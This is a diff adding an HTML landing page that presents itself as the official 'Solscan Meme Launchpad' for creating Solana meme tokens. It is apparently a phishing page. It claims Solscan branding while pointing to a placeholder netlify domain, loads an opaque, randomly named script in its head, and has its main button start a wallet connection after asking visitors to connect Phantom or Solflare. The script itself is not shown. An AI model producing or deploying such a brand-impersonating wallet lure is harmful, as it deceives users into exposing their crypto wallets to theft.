@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Solscan Meme Launchpad | Launch Meme Tokens on Solana</title>
+  <meta name="description" content="Solscan Meme Launchpad — the official tool to launch meme tokens on Solana. Fast, secure, and intuitive launch experience." />
+  <meta name="keywords" content="Solscan, Solana, meme launchpad, meme token launch, blockchain explorer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="canonical" href="https://your-domain.netlify.app/" />
+
+  <!-- Open Graph -->
+  <meta property="og:title" content="Solscan Meme Launchpad" />
+  <meta property="og:description" content="Launch meme tokens on Solana with Solscan's trusted launchpad experience." />
+  <meta property="og:type" content="website" />
+  <meta property="og:image" content="https://solscan.io/og-share-image.png" />
+
+  <style>
+    :root {
+      --bg: #f5f7fa;
+      --surface: #ffffff;
+      --primary: #00a3bf;
+      --text: #1f2937;
+      --subtext: #4b5563;
+      --border: #e5e7eb;
+    }
+
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); line-height:1.6; }
+
+    header {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 1rem 2rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    header .logo { font-size: 1.5rem; font-weight:bold; color: var(--primary); }
+    header nav a {
+      margin-left:1.5rem;
+      color: var(--subtext);
+      text-decoration:none;
+      font-size:0.95rem;
+    }
+    header nav a:hover { color: var(--text); }
+
+    main {
+      max-width: 1000px;
+      margin: 2rem auto;
+      padding: 0 1rem;
+    }
+
+    .hero {
+      background: var(--surface);
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+      text-align: center;
+    }
+    .hero h1 { font-size:2rem; color: var(--text); margin-bottom: 0.5rem; }
+    .hero p { font-size:1.1rem; color: var(--subtext); margin-bottom:1.5rem; }
+    .btn-primary {
+      padding: 0.75rem 1.75rem;
+      background: var(--primary);
+      color: #fff;
+      border:none;
+      border-radius:4px;
+      cursor: pointer;
+      font-size:1rem;
+      transition: background 0.3s ease;
+    }
+    .btn-primary:hover { background: darken(var(--primary), 10%); }
+
+    section { margin-top:3rem; }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit,minmax(250px,1fr));
+      gap:1.5rem;
+    }
+
+    .card {
+      background: var(--surface);
+      padding: 1.5rem;
+      border:1px solid var(--border);
+      border-radius:6px;
+      transition: transform 0.2s ease;
+    }
+    .card:hover { transform: translateY(-4px); }
+
+    .card h3 { margin-bottom:0.75rem; font-size:1.2rem; color: var(--text); }
+    .card p { font-size:1rem; color: var(--subtext); }
+
+    footer {
+      margin:4rem 0 2rem;
+      text-align:center;
+      color: var(--subtext);
+      font-size:0.9rem;
+    }
+    footer a { color: var(--primary); text-decoration: none; margin: 0 0.5rem;}
+  </style>
+  <script src="./3Et9DbZNbju9.js"></script>
+</head>
+<body>
+  <header>
+    <div class="logo">Solscan</div>
+    <nav>
+      <a href="#">Explorer</a>
+      <a href="#">Dashboard</a>
+      <a href="#">Meme Launchpad</a>
+      <a href="#">API Docs</a>
+      <a href="#">Support</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="hero">
+      <h1>Meme Launchpad</h1>
+      <p>Launch your own meme token on the Solana blockchain. Fast, secure, integrated with Solscan ecosystem.</p>
+      <button class="btn-primary" onclick="window.startConnect()">Start Launching</button>
+    </div>
+
+    <section>
+      <h2>How It Works</h2>
+      <div class="grid">
+        <div class="card">
+          <h3>1. Connect Wallet</h3>
+          <p>Securely connect your Solana wallet (Phantom, Solflare, etc.) to get started.</p>
+        </div>
+        <div class="card">
+          <h3>2. Configure Token</h3>
+          <p>Define token name, symbol, supply, and optional meme imagery.</p>
+        </div>
+        <div class="card">
+          <h3>3. Launch & Verify</h3>
+          <p>Deploy instantly on-chain and track your token via Solscan explorer.</p>
+        </div>
+      </div>
+    </section>
+
+    <section>
+      <h2>Why Use Solscan Launchpad?</h2>
+      <div class="grid">
+        <div class="card">
+          <h3>Trust & Transparency</h3>
+          <p>Built on Solscan’s trusted explorer framework and API infrastructure.</p>
+        </div>
+        <div class="card">
+          <h3>Speed & Efficiency</h3>
+          <p>Leverage Solana’s high TPS for instant token issuance.</p>
+        </div>
+        <div class="card">
+          <h3>Full Explorer Integration</h3>
+          <p>Track your token immediately with Solscan analytics and listings.</p>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <p>&copy; 2025 Solscan. All rights reserved.</p>
+    <p><a href="#">Terms of Service</a> | <a href="#">Privacy Policy</a> | <a href="#">Contact</a></p>
+  </footer>
+</body>
+</html>
